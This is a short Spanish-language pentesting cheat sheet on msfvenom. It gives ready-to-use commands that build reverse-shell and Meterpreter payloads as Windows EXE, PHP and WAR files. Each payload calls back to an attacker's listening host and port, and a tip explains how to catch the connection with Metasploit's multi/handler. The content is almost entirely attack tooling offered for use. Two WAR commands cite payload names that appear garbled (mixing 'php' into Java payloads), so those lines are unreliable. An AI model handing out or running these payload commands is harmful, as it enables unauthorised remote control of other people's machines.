# 💉 Msfvenom

## Generación de payloads meterpreter

### Meterpreter Reverse Shell TCP con EXE

Para generar un payload, debemos de usar la siguiente sintaxis:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4242 -f exe -o pwned.exe
```

{% hint style="info" %}
Para ponerse a la escucha con metasploit a la espera de la ejecución del payload, deberemos usar la herramienta interna de metasploit llamada "multi handler".&#x20;

Para ello, ejecutamos metasploit y una vez con el prompt, escribimos "`use /multi/handler`". Para poder usarlo, deberemos ejecutar LHOST y LPORT
{% endhint %}

{% hint style="warning" %}
Puede que nos de un error de arquitectura, en este caso, usaremos este comando en el cual se ha cambiado el payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4242 -f exe -o pwned.exe
```
{% endhint %}

### Meterpreter Reverse Shell TCP con PHP

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
```

## Generación de payloads reverse shell

### Reverse Shell TCP con PHP

Para generar un payload, debemos de usar el siguiente comando:

```bash
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=4242 -f raw > pwned.php
```

### Reverse Shell TCP con WAR

Para generar un payload, debemos de usar el siguiente comando:

```bash
msfvenom -p java/shell_reverse_php LHOST=192.168.1.2 LPORT=4242 -f war > pwned.war
```

#### Otra opción

```bash
msfvenom -p java/jsp_shell_reverse_php LHOST=192.168.1.2 LPORT=4242 -f war > pwned.war
```
